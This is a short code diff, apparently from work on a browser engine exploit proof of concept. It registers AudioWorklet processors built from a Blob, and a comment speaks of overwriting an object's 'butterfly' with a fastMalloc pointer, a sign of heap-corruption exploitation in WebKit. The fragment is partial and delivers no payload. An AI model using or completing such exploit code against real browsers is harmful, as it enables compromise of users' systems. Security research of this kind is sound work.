@@ -2,21 +2,7 @@
 alert("Starting");
 var offctx = new OfflineAudioContext(1,128,300000);
 offctx.audioWorklet.addModule(URL.createObjectURL(new Blob([`
-class a extends AudioWorkletProcessor {
-    constructor(){
-        super();
-        //var fuck2 = new AudioWorkletProcessor();
-        return b;
-    }
-    static get parameterDescriptors() {
-        return []
-    }
-    process (inputs, outputs, parameters) {
-        
-        return false;
-    }
-}
-/*registerProcessor("a", class {
+registerProcessor("a", class {
         constructor() {
           // setup a message port to the main thread
           port = new AudioWorkletProcessor().port;
@@ -33,9 +19,9 @@ registerProcessor("b", class {
           // overwrite b1's butterfly with a fastMalloc pointer
           return {fill: 1, b: b0};
         }
-      });*/
+      });
 
-`],{type:'text/javascript'}))).then(async () => {
+`],{type:'text/javascript'})),{ credentials: 'omit',}).then(async () => {
 var node1 = new AudioWorkletNode(offctx, "a");
 var node2 = new AudioWorkletNode(offctx, "b");
         node1.port.onmessage = (e) => {
